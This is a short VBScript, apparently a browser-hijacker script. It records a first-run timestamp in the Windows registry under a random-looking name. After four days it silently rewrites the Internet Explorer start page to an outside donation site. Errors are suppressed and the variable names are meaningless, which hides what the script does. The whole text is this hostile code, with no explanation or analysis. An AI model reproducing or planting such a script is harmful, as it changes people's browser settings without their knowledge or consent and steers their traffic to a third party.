set ewtyt=CreateObject("WScript.Shell")
On error resume next
ksivmql=ewtyt.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ksivmql")
if ksivmql="" Then 
 ewtyt.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ksivmql",Now()
Else
 if DateDiff("d",ksivmql,Now())>4 Then ewtyt.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.freedonation.com"
End if